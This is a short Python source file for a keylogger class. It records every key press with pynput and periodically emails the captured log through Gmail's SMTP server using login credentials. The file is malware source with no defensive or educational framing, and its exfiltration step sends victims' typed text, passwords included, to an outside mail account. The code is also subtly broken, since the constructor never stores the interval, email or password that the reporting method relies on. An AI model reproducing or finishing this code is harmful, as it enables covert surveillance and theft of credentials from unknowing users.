import pynput.keyboard
import threading
import smtplib

log = ""

class KeyLogger:
    def __init__(self,interval,email,password):
        self.log = ""

    def appendToLog(self, string):
        self.log = self.log + string

    
    def key_press(self,key):
        currKey = ""
        try:
            currKey = str(key.char)
        except AttributeError:
            if key == key.space:
                currKey = currKey + " "
            else:
                currKey = currKey + " " + str(key) + " "
        self.appendToLog(currKey)

    def sendMail(self,email, password,message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()


    def report(self): 
        self.sendMail(self.email,self.password,"\n\n"+self.log)

        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start() 

    def start(self):
        keyboardListener = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboardListener:
            self.report()
            keyboardListener.join()


